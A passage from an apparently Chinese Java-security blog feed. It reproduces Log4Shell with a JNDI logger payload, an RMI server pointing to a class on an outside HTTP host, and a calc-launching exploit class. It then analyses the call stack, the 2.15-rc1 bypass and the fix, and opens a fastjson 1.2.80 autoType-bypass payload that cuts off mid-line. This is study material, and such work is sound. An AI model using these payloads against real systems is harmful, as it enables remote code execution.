&#123;<br>        <span class="hljs-comment">// 开启 trustURLCodebase，因为我的jdk版本较高</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        logger.info(<span class="hljs-string">&quot;这是info级别的日志&quot;</span>);<br>        logger.warn(<span class="hljs-string">&quot;这是warn级别的日志&quot;</span>);<br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:rmi://localhost:1099/Exploit8&#125;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建JNDI引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit8&quot;</span>, <span class="hljs-string">&quot;Exploit8&quot;</span>, <span class="hljs-string">&quot;http://lingx5.dns.army:8000/&quot;</span>);<br>            <span class="hljs-comment">// 封装Reference对象</span><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            registry.bind(<span class="hljs-string">&quot;Exploit8&quot;</span>,refWrapper);<br>            System.out.println(<span class="hljs-string">&quot;RMI registry started at 1099.&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exploit8"><a href="#Exploit8" class="headerlink" title="Exploit8"></a>Exploit8</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit8</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>开启 RMI 服务器</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401145414399.png" alt="image-20250401145414399" style="zoom: 80%;" /><p>开启 http 服务</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401154504520.png" alt="image-20250401154504520"></p><p>运行 log4jDemo</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401154552834.png" alt="image-20250401154552834"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>总体来说，入口主要是 org.apache.logging.log4j.core.lookup.StrSubstitutor 提供的 lookups 功能  这是 <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">官方文档</a></p><p>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format 方法中 检测 <code>$&#123;</code> 开头的位置</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401161645164.png" alt="image-20250401161645164"></p><p>在 org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute 方法里 处理字符串，并交给 org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401162826294.png" alt="image-20250401162826294"></p><p>他会调用 Interpolator （代理类）的 lookup 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">resolveVariable</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String variableName, <span class="hljs-keyword">final</span> StringBuilder buf, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> startPos, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> endPos)</span> &#123;<br>    <span class="hljs-type">StrLookup</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getVariableResolver();<br>    <span class="hljs-keyword">return</span> resolver == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : resolver.lookup(event, variableName);<br>&#125;<br></code></pre></td></tr></table></figure><p>拿到 JNDILookup</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401163218614.png" alt="image-20250401163218614"></p><p>拿到 jndiManager，执行 lookup </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401163617165.png" alt="image-20250401163617165"></p><p>后续就是 JNDI 的查询和远程类加载了</p><p>看一下完整的调用栈吧</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250401164014477.png" alt="image-20250401164014477"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">loadClass:<span class="hljs-number">96</span>, VersionHelper12 (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.naming</span>.internal)<br>loadClass:<span class="hljs-number">101</span>, VersionHelper12 (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.naming</span>.internal)<br>loadClass:<span class="hljs-number">115</span>, VersionHelper12 (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.naming</span>.internal)<br>getObjectFactoryFromReference:<span class="hljs-number">164</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>getObjectInstance:<span class="hljs-number">330</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>decodeObject:<span class="hljs-number">499</span>, RegistryContext (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span>.registry)<br>lookup:<span class="hljs-number">138</span>, RegistryContext (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span>.registry)<br>lookup:<span class="hljs-number">218</span>, GenericURLContext (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span>.url)<br>lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)<br>lookup:<span class="hljs-number">172</span>, JndiManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.net)<br>lookup:<span class="hljs-number">56</span>, JndiLookup (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.lookup)<br>lookup:<span class="hljs-number">223</span>, Interpolator (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.lookup)<br>resolveVariable:<span class="hljs-number">1116</span>, StrSubstitutor (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.lookup)<br>substitute:<span class="hljs-number">1038</span>, StrSubstitutor (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.lookup)<br>substitute:<span class="hljs-number">912</span>, StrSubstitutor (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.lookup)<br>replace:<span class="hljs-number">467</span>, StrSubstitutor (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.lookup)<br>format:<span class="hljs-number">132</span>, MessagePatternConverter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.pattern)<br>format:<span class="hljs-number">38</span>, PatternFormatter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.pattern)<br>toSerializable:<span class="hljs-number">345</span>, PatternLayout<span class="hljs-variable">$PatternSerializer</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.layout)<br>toText:<span class="hljs-number">244</span>, PatternLayout (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.layout)<br>encode:<span class="hljs-number">229</span>, PatternLayout (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.layout)<br>encode:<span class="hljs-number">59</span>, PatternLayout (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.layout)<br>directEncodeEvent:<span class="hljs-number">197</span>, AbstractOutputStreamAppender (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.appender)<br>tryAppend:<span class="hljs-number">190</span>, AbstractOutputStreamAppender (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.appender)<br>append:<span class="hljs-number">181</span>, AbstractOutputStreamAppender (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.appender)<br>tryCallAppender:<span class="hljs-number">156</span>, AppenderControl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>callAppender0:<span class="hljs-number">129</span>, AppenderControl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>callAppenderPreventRecursion:<span class="hljs-number">120</span>, AppenderControl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>callAppender:<span class="hljs-number">84</span>, AppenderControl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>callAppenders:<span class="hljs-number">543</span>, LoggerConfig (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>processLogEvent:<span class="hljs-number">502</span>, LoggerConfig (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>log:<span class="hljs-number">485</span>, LoggerConfig (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>log:<span class="hljs-number">460</span>, LoggerConfig (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>log:<span class="hljs-number">82</span>, AwaitCompletionReliabilityStrategy (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span>.config)<br>log:<span class="hljs-number">161</span>, Logger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.core)<br>tryLogMessage:<span class="hljs-number">2198</span>, AbstractLogger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.spi)<br>logMessageTrackRecursion:<span class="hljs-number">2152</span>, AbstractLogger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.spi)<br>logMessageSafely:<span class="hljs-number">2135</span>, AbstractLogger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.spi)<br>logMessage:<span class="hljs-number">2011</span>, AbstractLogger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.spi)<br>logIfEnabled:<span class="hljs-number">1983</span>, AbstractLogger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.spi)<br>error:<span class="hljs-number">740</span>, AbstractLogger (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span>.spi)<br><span class="hljs-selector-tag">main</span>:<span class="hljs-number">17</span>, log4jDemo (com.lingx5)<br></code></pre></td></tr></table></figure><h2 id="log4j-2-15-rc1-绕过"><a href="#log4j-2-15-rc1-绕过" class="headerlink" title="log4j-2.15-rc1 绕过"></a>log4j-2.15-rc1 绕过</h2><p>官方在爆出 log4shell 漏洞后，更新了 相对安全的版本 log4j-2.15.0-rc1，</p><p>改变了 org.apache.logging.log4j.core.pattern.MessagePatternConverter 类对 loadNoLookups 方法</p><p>在 <code>log4j-2.14.0</code> 中，是 loadNoLookups</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">loadNoLookups</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>    <span class="hljs-keyword">if</span> (options != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; options.length; i++) &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> options[i];<br>            <span class="hljs-comment">// NOLOOKUPS 是一个常量，假设其值为 &quot;nolookups&quot; 或类似的字符串</span><br>            <span class="hljs-keyword">if</span> (NOLOOKUPS.equalsIgnoreCase(option)) &#123;<br>                <span class="hljs-keyword">return</span> i; <span class="hljs-comment">// 返回找到 &quot;nolookups&quot; 选项的索引</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <span class="hljs-comment">// 没有找到或 options 为 null，返回 -1</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>log4j-2.15.0-rc1</code> 改为了 loadLookups 静态方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadLookups</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>    <span class="hljs-keyword">if</span> (options != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// var1, var2, var3 是中间变量，功能上等同于直接使用 options 和 i</span><br>        String[] var1 = options;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> options.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var3 &lt; var2; ++var3) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> var1[var3];<br>            <span class="hljs-comment">// 直接与字符串 &quot;lookups&quot; 比较</span><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;lookups&quot;</span>).equalsIgnoreCase(option)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 找到 &quot;lookups&quot; 选项，返回 true</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 没有找到或 options 为 null，返回 false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>从方法的命名中，我们也不难看出 <code>log4j-2.14.0</code> 默认开启 lookups 功能，而 <code>log4j-2.15.0-rc1</code> 改为了默认关闭</p><p>同时在MessagePatternConverter 添加了内部类（都继承了MessagePatternConverter ）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleMessagePatternConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MessagePatternConverter</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormattedMessagePatternConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MessagePatternConverter</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LookupMessagePatternConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MessagePatternConverter</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RenderingPatternConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MessagePatternConverter</span><br></code></pre></td></tr></table></figure><p>且各自都实现了 format 方法，而在 MessagePatternConverter 初始化时，就检测了 lookups 功能是否开启</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MessagePatternConverter <span class="hljs-title function_">newInstance</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Configuration config, <span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>    <span class="hljs-comment">// 检测 lookups是否 开启</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">lookups</span> <span class="hljs-operator">=</span> loadLookups(options);<br>    String[] formats = withoutLookupOptions(options);<br>    <span class="hljs-type">TextRenderer</span> <span class="hljs-variable">textRenderer</span> <span class="hljs-operator">=</span> loadMessageRenderer(formats);<br>    <span class="hljs-comment">// 默认使用 FormattedMessagePatternConverter 或 SimpleMessagePatternConverter</span><br>    <span class="hljs-type">MessagePatternConverter</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (MessagePatternConverter)(formats != <span class="hljs-literal">null</span> &amp;&amp; formats.length != <span class="hljs-number">0</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormattedMessagePatternConverter</span>(formats) : MessagePatternConverter.SimpleMessagePatternConverter.INSTANCE);<br>    <span class="hljs-comment">// lookups 开启 才封装为具有lookup能力的LookupMessagePatternConverter</span><br>    <span class="hljs-keyword">if</span> (lookups &amp;&amp; config != <span class="hljs-literal">null</span>) &#123;<br>        result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LookupMessagePatternConverter</span>(result, config);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (textRenderer != <span class="hljs-literal">null</span>) &#123;<br>        result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RenderingPatternConverter</span>(result, textRenderer);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>到这里，我们要想实现绕过，肯定是要开启 lookups 功能的</p></blockquote><h3 id="导致绕过的关键"><a href="#导致绕过的关键" class="headerlink" title="导致绕过的关键"></a>导致绕过的关键</h3><p>在 JndiManager.java 中做了 校验，但可以通过异常来进行绕过</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250402120746203.png" alt="image-20250402120746203"></p><p>也就是说 在 rc1 中 catch 捕获到异常，但是没有return 掉，导致最后的 <code>return (T) this.context.lookup(name);</code> 还是会执行</p><p>我们只需要 在 url 中添加空格字符，就可以利用异常来绕过</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在 2.15-rc2 中 添加了 <code>return null;</code> 语句，绕过被修复了 ，在 2.16.0-rc1 版本中，Message Lookups 被彻底删除，log4shell 也就落下了帷幕。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/LittleHann/p/17721995.html">Log4j 漏洞原理研究 - 郑瀚 - 博客园</a></p><p><a href="https://tttang.com/archive/1378/">浅谈 Log4j2 漏洞 - 跳跳糖</a></p><p><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookups :: Apache Log4j</a></p><p><a href="https://note.tonycrane.cc/sec/vulns/log4j/">log4j 漏洞复现 - 鹤翔万里的笔记本</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>log4shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson-1.2.80</title>
    <link href="/2025/03/31/fastjson-1-2-80/"/>
    <url>/2025/03/31/fastjson-1-2-80/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="fastjson-1-2-80-bypass"><a href="#fastjson-1-2-80-bypass" class="headerlink" title="fastjson-1.2.80-bypass"></a>fastjson-1.2.80-bypass</h1><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在 fastjson1.2.68 修复中，作者把 <code>java.lang.Runnable</code>，<code>java.lang.Readable</code> 和 <code>java.lang.AutoCloseable</code> 加入了黑名单，把 AutoCloseable 的绕过就给堵死了，但是 你还记不记得 我们在讨论 fastjson-1.2.68 绕过时，expectClass 还有一个 Throwable 可以利用，mappings 缓存中保存了他的子类 <code>Exception</code> 我们在 1.2.80 中，可以利用 Exception 来做一些事情。</p><h2 id="fastjson-特性"><a href="#fastjson-特性" class="headerlink" title="fastjson 特性"></a>fastjson 特性</h2><p>这里主要用到的特性就是 <strong>Fastjson 在反序列化过程中，通过分析已加载类的方法或构造函数签名，识别出其参数类型，并将这些参数类型和它对应的反序列化器，暂时加入 deserializers 表中，等到再次执行 JavaBeanDeserializer#deserialze 方法时，实现自定义 excpetClass，从而绕过 AutoType 的检测</strong></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>为了弄清原理，我们自己写个类 ，继承 Exception。因为要从 Exception 去绕过第一次 checkAutoType，然后利用 <code>构造函数的参数</code> 类型实现二次绕过</p><p><strong>MyException</strong></p><p>构造函数参数给了一个 OutputStream 类型 ，用来当第二次的 expectClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.fastjson1_2_8;<br><br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyException</span><span class="hljs-params">(OutputStream out)</span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里从 fastjson1.2.68 中 随便找了一条 io 链</p><p><strong>poc</strong></p><p>实现 exp 的 1.txt 移动到 poc 目录下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.lingx5.fastjson1_2_8.MyException&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.OutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:\\WebSafe\\JavaProject\\fastjson\\src\\main\\java\\com\\lingx5\\exp\\1.txt&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span 